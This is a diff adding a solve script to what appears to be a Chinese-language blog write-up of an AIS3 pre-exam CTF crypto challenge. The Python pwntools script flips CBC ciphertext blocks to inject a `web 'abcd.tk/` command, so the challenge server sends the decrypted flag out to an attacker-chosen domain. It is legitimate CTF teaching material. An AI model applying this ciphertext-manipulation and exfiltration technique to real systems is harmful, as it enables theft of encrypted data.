@@ -907,7 +907,93 @@ main()</code></pre><p>unpad 有好好檢查，沒什麼問題。但這題 paddin
 <p>受限於 block size 的限制，我們的 domain name 要越短越好，所以直接上 <a href="http://dot.tk/">dot.tk</a> 申請一個免洗的 top domain，四個字 <code>abcd.tk</code> 是不用錢的。</p>
 <p>回到題目，這裡第 8 個 block 解爛不會怎樣，反正有第 9 個 block 的單引號就好，所以我們可以把第 9 個 block 變成 <code>&#39;\nweb  &#39;abcd.tk/</code> （其實 domain也不用這麼短），後面 parse 會補 <code>http://</code>，第 10 個 block 之後就接 flag 解密的 block，就能看到 server 把 flag 放在 url 傳回來了。</p>
 <p>Flag 有提到 <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-17689">CVE-2017-17689</a> ，就是對 CBC 操作控制明文的 bug。</p>
-        </article>
+<p>Script:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-comment"># Python 3.6.5</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product
+
+chars = string.digits + string.ascii_letters
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">PoW</span><span class="hljs-params">(prefix)</span>:</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> product(*[chars <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>)]):
+        x = prefix + <span class="hljs-string">''</span>.join(i)
+        sha256 = hashlib.sha256()
+        sha256.update(x.encode())
+        <span class="hljs-keyword">if</span> sha256.hexdigest()[:<span class="hljs-number">6</span>] == <span class="hljs-string">'000000'</span>:
+            <span class="hljs-keyword">return</span> x
+    <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"Unfortunately, PoW not found."</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fold16</span><span class="hljs-params">(x)</span>:</span>
+    <span class="hljs-keyword">return</span> [x[i*<span class="hljs-number">16</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(x)//<span class="hljs-number">16</span>+<span class="hljs-number">1</span>)]
+
+ps = [
+    <span class="hljs-string">b'From: thor@ais3.'</span>,
+    <span class="hljs-string">b'org\nTo: ctfplaye'</span>,
+    <span class="hljs-string">b'r@ais3.org\n\n--BO'</span>,
+    <span class="hljs-string">b'UNDARY\nType: tex'</span>,
+    <span class="hljs-string">b't\nWelcome to AIS'</span>,
+    <span class="hljs-string">b'3 pre-exam.\n\n--B'</span>,
+    <span class="hljs-string">b'OUNDARY\nType: cm'</span>,
+    <span class="hljs-string">b"d\necho 'This is "</span>,
+    <span class="hljs-string">b'the blog of oali'</span>, <span class="hljs-comment">#8</span>
+    <span class="hljs-string">b"eno'\nweb 'https:"</span>,
+    <span class="hljs-string">b'//oalieno.github'</span>, <span class="hljs-comment">#10</span>
+    <span class="hljs-string">b".io'\necho 'This "</span>,<span class="hljs-comment">#11 leak</span>
+    <span class="hljs-string">b'is the blog of b'</span>,<span class="hljs-comment">#12 leak</span>
+    <span class="hljs-string">b"amboofox team'\nw"</span>,<span class="hljs-comment">#13 leak</span>
+    <span class="hljs-string">b"eb 'https://bamb"</span>,<span class="hljs-comment">#14 leak</span>
+    <span class="hljs-string">b'oofox.github.io/'</span>, <span class="hljs-comment">#15</span>
+    <span class="hljs-string">b"'\n\n--BOUNDARY\nTy"</span>,<span class="hljs-comment">#16</span>
+    <span class="hljs-string">b'pe: text\nYou can'</span>,
+    <span class="hljs-string">b' find some usefu'</span>,
+    <span class="hljs-string">b'l tutorial on th'</span>,
+    <span class="hljs-string">b'ere.\nAnd you mig'</span>,
+    <span class="hljs-string">b'ht be wondering '</span>,
+    <span class="hljs-string">b'where is the fla'</span>,
+    <span class="hljs-string">b'g?\nJust hold tig'</span>,
+    <span class="hljs-string">b'ht, and remember'</span>,
+    <span class="hljs-string">b' that patient is'</span>,
+    <span class="hljs-string">b' virtue.\n\n--BOUN'</span>,
+    <span class="hljs-string">b'DARY\nType: text\n'</span>,
+    <span class="hljs-string">b'Here is your fla'</span>,
+]
+
+
+server = remote(<span class="hljs-string">'104.199.235.135'</span>, <span class="hljs-number">20003</span>)
+<span class="hljs-comment">#server = remote('127.0.0.1', 20003)</span>
+pow_str = server.recvuntil(<span class="hljs-string">'x = '</span>).decode()
+x_prefix = pow_str.split(<span class="hljs-string">"'"</span>)[<span class="hljs-number">1</span>]
+ans = PoW(x_prefix)
+server.sendline(ans)
+server.recvuntil(<span class="hljs-string">'&gt; '</span>)
+server.sendline(<span class="hljs-string">'1'</span>)
+b64 = server.recvuntil(<span class="hljs-string">'\n\n'</span>)
+cs = fold16(base64.b64decode(b64))
+server.recvuntil(<span class="hljs-string">'&gt; '</span>)
+<span class="hljs-comment">#server.recvuntil('')</span>
+<span class="hljs-comment">#print(cs)</span>
+
+<span class="hljs-keyword">assert</span> ps[<span class="hljs-number">8</span>] == <span class="hljs-string">b'the blog of oali'</span>
+inject = <span class="hljs-string">b"'\nweb  'abcd.tk/"</span>
+<span class="hljs-keyword">assert</span> len(inject) == <span class="hljs-number">16</span>
+<span class="hljs-comment">#cs[8] = xor(cs[8], ps[9], inject)</span>
+cs[<span class="hljs-number">8</span>] = xor(cs[<span class="hljs-number">8</span>], ps[<span class="hljs-number">9</span>], inject)
+
+<span class="hljs-keyword">assert</span> ps[<span class="hljs-number">28</span>] == <span class="hljs-string">b'Here is your fla'</span>
+cs[<span class="hljs-number">10</span>] = cs[<span class="hljs-number">28</span>] <span class="hljs-comment"># In order to display cs[29] properly</span>
+cs[<span class="hljs-number">11</span>] = cs[<span class="hljs-number">29</span>]
+cs[<span class="hljs-number">12</span>] = cs[<span class="hljs-number">30</span>]
+cs[<span class="hljs-number">13</span>] = cs[<span class="hljs-number">31</span>]
+cs[<span class="hljs-number">14</span>] = cs[<span class="hljs-number">32</span>]
+
+server.sendline(<span class="hljs-string">'2'</span>)
+print(server.recvuntil(<span class="hljs-string">': '</span>))
+b64 = base64.b64encode(<span class="hljs-string">b''</span>.join(cs))
+server.sendline(b64)
+server.interactive()
+<span class="hljs-comment">#print(server.recv())</span></code></pre>        </article>
       </div>
       <!-- Main Col END -->
 
